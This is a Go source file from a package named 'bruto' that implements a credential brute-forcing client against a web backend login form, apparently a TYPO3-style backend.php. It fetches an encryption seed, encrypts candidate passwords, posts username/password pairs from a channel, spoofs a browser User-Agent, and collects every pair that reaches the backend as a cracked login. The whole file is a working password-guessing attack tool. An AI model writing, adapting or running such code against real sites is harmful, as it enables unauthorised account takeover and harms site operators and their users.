package bruto

import (
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"net/http/cookiejar"
	"net/http/httputil"
	"net/url"
	//	"os"
	"strings"
)

var errSessionOver = errors.New("Session has terminated")
var errSessionReady = errors.New("Session has started")
var errSessionAttempt = errors.New("Login attempt")

const userAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0"

type sessionError struct {
	s   *session
	err error
}

func newSessionError(s *session, err error) *sessionError {
	return &sessionError{s: s, err: err}
}

func (s *sessionError) ready() bool {
	return s.err == errSessionReady
}

func (s *sessionError) attempt() bool {
	return s.err == errSessionAttempt
}

func (s *sessionError) finished() bool {
	return s.err == errSessionOver
}

func (s *sessionError) Error() string {
	return s.err.Error()
}

type session struct {
	debug io.Writer
	// URLs configuration
	urls urls
	// Session connection
	client   *http.Client
	postVals url.Values
	// encrypted is initialized to encrypt passwords after the
	// session is ready.
	enc *encrypter
	// ready is closed when the session is ready, otherwise
	// an error is sent then the channel is closed.
	sessions chan<- error
	// password channel generates passwords to try
	logins <-chan login
	// broken is the channel where sucessful logins are sent
	broken chan<- login
}

func newSession(urls urls, sessions chan<- error, logins <-chan login, broken chan<- login) *session {
	s := &session{
		//		debug:	  os.Stdout,
		enc:      &encrypter{},
		urls:     urls,
		sessions: sessions,
		logins:   logins,
		broken:   broken,
		postVals: url.Values{},
	}
	// Preset constant POST values
	s.postVals.Set("login_status", "login")
	s.postVals.Set("redirect_url", "backend.php")
	s.postVals.Set("loginRefresh", "")
	s.postVals.Set("p_field", "")
	s.postVals.Set("openid_url", "")
	s.postVals.Set("commandLI", "Submit")
	s.postVals.Set("interface", "backend")
	return s
}

func (s *session) ready() {
	s.sessions <- newSessionError(s, errSessionReady)
}

func (s *session) fail(err error) error {
	s.sessions <- newSessionError(s, err)
	return err
}

func (s *session) prepareReq(req *http.Request) *http.Request {
	// Server crashes if the User-Agent is not "known"
	req.Header.Set("User-Agent", userAgent)
	req.Header.Set("Referer", s.urls.referer())
	req.Header.Set("Cache-Control", "max-age=0")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	for _, cookie := range s.client.Jar.Cookies(req.URL) {
		req.AddCookie(cookie)
	}
	return req
}

func (s *session) httpDo(req *http.Request) (*http.Response, error) {
	req = s.prepareReq(req)
	if s.debug != nil {
		b, err := httputil.DumpRequestOut(req, true)
		if err != nil {
			return nil, err
		}
		fmt.Fprintf(s.debug, "%s\n", b)
	}
	res, err := s.client.Do(req)
	if s.debug != nil {
		b, err := httputil.DumpResponse(res, true)
		if err != nil {
			return nil, err
		}
		fmt.Fprintf(s.debug, "%s\n", b)
	}
	return res, err
}

func (s *session) httpPost(url string, vals *url.Values) (*http.Response, error) {
	req, err := http.NewRequest("POST", url, strings.NewReader(vals.Encode()))
	if err != nil {
		return nil, err
	}
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	return s.httpDo(req)
}

func (s *session) httpGet(url string) (*http.Response, error) {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Add("X-Requested-With", "XMLHttpRequest")
	return s.httpDo(req)
}

func (s *session) init() error {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return err
	}
	s.client = &http.Client{
		Jar: jar,
		// Timeout: ... TODO: set this to something > 5s
	}
	resp, err := s.httpGet(s.urls.ajax())
	if err != nil {
		return err
	}
	// Don't care about body, just get the header
	io.Copy(ioutil.Discard, resp.Body)
	resp.Body.Close()
	if resp.StatusCode != 200 {
		return errors.New(fmt.Sprintf("Invalid status code for AJAX call: %s", resp.Status))
	}
	xjson := resp.Header.Get("X-JSON")
	if xjson == "" {
		return errors.New("Response to AJAX call contained no JSON")
	}
	// Stupid and inefficient unmarshalling of JSON, for now
	if err := json.Unmarshal([]byte(xjson), &s.enc); err != nil {
		return err
	}
	return s.enc.seed()
}

func (s *session) try(l login) error {
	// Encrypt password
	data, err := s.enc.encrypt(l.pass)
	if err != nil {
		return err
	}
	// Set request specific POST values
	s.postVals.Set("userident", data)
	s.postVals.Set("username", l.user)
	// Post login form
	resp, err := s.httpPost(s.urls.login(), &s.postVals)
	if err != nil {
		return err
	}
	// If the current location is "backend.php", we are in
	if strings.Index(resp.Request.URL.Path, "backend.php") >= 0 {
		// This login worked, send back on the broken logins channel
		s.broken <- l
	}
	// Signal that this attempt is over
	s.fail(errSessionAttempt)
	return nil
}

func (s *session) run() error {
	if err := s.init(); err != nil {
		return s.fail(err)
	}
	// Signal that this session is ready to do real work
	s.ready()
	// Fetch login pairs and try them
	for l := range s.logins {
		if err := s.try(l); err != nil {
			return s.fail(err)
		}
	}
	// Signal that this session has terminated
	return s.fail(errSessionOver)
}
